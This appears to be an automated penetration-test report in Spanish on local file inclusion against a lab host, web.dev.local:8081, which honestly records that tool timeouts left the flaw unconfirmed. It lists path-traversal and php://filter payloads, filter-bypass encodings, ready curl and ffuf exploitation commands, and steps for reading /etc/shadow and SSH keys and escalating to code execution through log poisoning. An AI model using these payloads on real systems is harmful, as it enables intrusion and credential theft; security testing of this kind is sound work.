# Informe de auditoría LFI — web.dev.local:8081

Fecha: 2026-04-27T07:26:00Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
No fue posible confirmar ni explotar una vulnerabilidad LFI contra el objetivo desde este entorno automatizado: las herramientas remotas del MCP fallaron por timeouts en las fases de reconocimiento (conectividad / ejecución de comandos). Por tanto: VULN_FOUND: false y VULN_EXPLOITED: false.

Acciones realizadas (intento de ejecución)
----------------------------------------
Se intentaron las siguientes acciones y comandos (salida no disponible por timeouts):

- Escaneo de puertos y servicios:
  - nmap -sV -p 8081 web.dev.local

- Escaneo de aplicación web y vectores comunes:
  - nikto -host http://web.dev.local:8081
  - gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt -q
  - dirb http://web.dev.local:8081 /usr/share/wordlists/dirb/common.txt -r -S

- Fuzzing para parámetros y rutas (propuestas):
  - ffuf -u 'http://web.dev.local:8081/?page=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50 -mc 200
  - ffuf -u 'http://web.dev.local:8081/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -mc 200
  - wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 'http://web.dev.local:8081/?page=FUZZ' -t 50

- Fuzzing y payloads LFI específicos (ejemplos a ejecutar en entorno con conectividad):
  - Payloads simples de traversal:
    - ../../../etc/passwd
    - ../../../../../../etc/passwd
    - ../../../../../../etc/passwd%00
  - Wrappers y encoding para PHP:
    - php://filter/read=convert.base64-encode/resource=index.php
    - php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
  - Bypass common filters:
    - ..%2f..%2f..%2fetc%2fpasswd
    - ..%252f..%252f..%252fetc%252fpasswd
    - ../../../../../../proc/self/environ (para log poisoning)

Hallazgos
---------
- Conectividad / ejecución de herramientas: fallo (timeouts del servicio MCP al intentar ejecutar nmap/nikto/gobuster/dirb). No se obtuvo ninguna respuesta válida del objetivo desde este entorno.
- No se han leído ficheros internos ni del sistema; por tanto no hay evidencia de LFI explotado.

Evidencia y pruebas (ausente)
-----------------------------
No hay capturas de salida ni ficheros obtenidos porque las herramientas remotas no completaron sus procesos (timeout). Si se requiere evidencia, ejecutar los comandos listados en una sesión con conectividad directa al objetivo y guardar la salida.

Recomendaciones / próximos pasos operativos
-------------------------------------------
1. Verificar conectividad desde el entorno de pruebas hacia web.dev.local:8081 (DNS / hosts / red) y re-ejecutar las siguientes pruebas:
   - nmap -sV -p 8081 web.dev.local
   - nikto -host http://web.dev.local:8081
   - ffuf -u 'http://web.dev.local:8081/?page=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50 -mc 200
2. Priorizar búsqueda de parámetros GET/POST/cookies cabezeras dinámicas que acepten rutas de fichero (page, file, template, view, lang, include, path).
3. Si se confirma LFI, usar php://filter/base64 wrapper para leer ficheros PHP y luego decodificar; intentar lectura de /etc/passwd y /etc/shadow (este último requiere privilegios) y buscar keys/id_rsa en home y /root.
4. Para escalada: intentar log poisoning apuntando a endpoints que escriban logs (User-Agent), luego incluir ruta del log via LFI o acceder a /proc/self/environ para RCE donde sea aplicable.

Comandos de explotación sugeridos (ejemplos exactos)
----------------------------------------------------
- ffuf para detectar parámetros vulnerables:
  ffuf -u 'http://web.dev.local:8081/?FUZZ=../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 40 -mc 200

- Leer index.php usando wrapper (si existe LFI en ?page=):
  curl -s 'http://web.dev.local:8081/?page=php://filter/read=convert.base64-encode/resource=pages/home.php' | base64 -d > home.php

- Intento directo /etc/passwd:
  curl -s 'http://web.dev.local:8081/?page=../../../../etc/passwd'

Impacto potencial si LFI está presente
-------------------------------------
- Divulgación de configuraciones sensibles (.env, config.php, .git/config) y credenciales.
- Extracción de /etc/passwd, posibles claves privadas y hashes; posible escalado a RCE mediante log poisoning o /proc/self/environ.

Conclusión
----------
Desde este entorno automatizado no ha sido posible completar los escaneos por problemas de conectividad/timeouts con las herramientas remotas (MCP). No hay evidencia de LFI explotada en esta sesión; VULN_FOUND: false y VULN_EXPLOITED: false.

Si se confirma conectividad, ejecutar los comandos listados y actualizar este informe con la evidencia obtenida (salidas de nmap/ffuf/curl y ficheros leídos).

-- Auditor: Laboratorio automatizado (Kali MCP)
